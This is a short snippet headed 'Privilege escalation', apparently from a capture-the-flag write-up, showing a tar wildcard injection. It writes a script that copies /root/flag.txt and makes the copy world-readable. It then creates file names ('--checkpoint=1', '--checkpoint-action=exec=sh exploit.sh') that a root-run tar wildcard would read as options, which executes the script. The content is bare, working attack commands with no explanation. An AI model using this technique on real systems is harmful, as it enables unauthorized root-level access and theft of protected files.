Privilege escalation
echo "cp /root/flag.txt ./flag_copy.txt && chmod 777 ./flag_copy.txt" > exploit.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh exploit.sh"
